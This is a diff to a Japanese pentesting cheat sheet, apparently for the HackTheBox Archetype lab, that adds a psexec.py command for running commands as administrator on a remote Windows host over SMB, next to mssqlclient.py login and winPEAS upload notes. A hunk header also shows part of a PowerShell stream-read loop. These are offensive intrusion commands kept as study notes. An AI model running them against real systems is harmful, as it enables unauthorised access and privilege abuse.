@@ -208,6 +208,10 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 | SNMP      | `snmpquery.py`（※別途）                                       |
 ```
 ```
+#kali
+/usr/share/doc/python3-impacket/examples/
+
+#インストールする場合
 git clone https://github.com/fortra/impacket.git
 sudo python3 setup.py install
 ```
@@ -216,6 +220,13 @@ MSSQL サーバ（TCP 1433）へログインして、SQL クエリを実行で�
 ```
 python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
 ```
+
+#### psexec.py
+SMB経由でリモートのWindowsホストに管理者権限でコマンド実行
+```
+python3 psexec.py administrator@{TARGET_IP}
+```
+
 ## winPEAS
 Windows 環境における権限昇格の可能性を自動で調査するためのツール
 #### 1. Kaliなどから Windows に winPEAS をアップロード
